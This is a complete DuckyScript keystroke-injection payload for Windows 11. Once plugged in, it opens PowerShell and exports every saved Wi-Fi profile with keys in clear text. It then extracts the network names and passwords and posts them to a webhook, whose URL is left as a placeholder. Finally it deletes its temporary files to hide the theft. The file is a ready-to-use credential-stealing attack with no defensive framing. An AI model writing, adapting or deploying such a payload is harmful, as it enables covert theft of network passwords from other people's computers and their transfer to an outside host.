REM GitHub.com/murdervan
REM Windows 11 Only

DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500

REM # Creating a temporary directory and changing to it
STRING $p = "$env:temp\p"; md $p > $null; cd $p;
ENTER
DELAY 100

REM # Exporting all saved wifi passwords to XML files in the temporary directory
STRING netsh wlan export profile key=clear > $null;
ENTER
DELAY 100

REM # Getting the names and passwords of all the saved wifi networks from the XML files and storing them in a variable
STRING $r = Get-ChildItem | ForEach-Object { $Xml = [xml](Get-Content $_.FullName); [PSCustomObject]@{ Name = $Xml.WLANProfile.Name; Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial } };
ENTER
DELAY 100

REM # Converting $r to a formatted string for the webhook message
STRING $formattedContent = $r | Out-String;
ENTER
DELAY 100

REM # Debugging: Output the formatted content to the console
STRING Write-Host "Formatted Content: $formattedContent";
ENTER
DELAY 100

REM # Check if the formatted content is empty
STRING if (-not [string]::IsNullOrWhiteSpace($formattedContent)) { $body = @{ content = $formattedContent }; Invoke-RestMethod -Uri 'YOUR_TOKEN_HERE' -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"; } else { Write-Host "No WiFi profiles found or the content is empty." }
ENTER
DELAY 100

REM # Deleting the temporary directory and exiting PowerShell
STRING cd ..; Remove-Item $p -Recurse -Force; exit;
ENTER

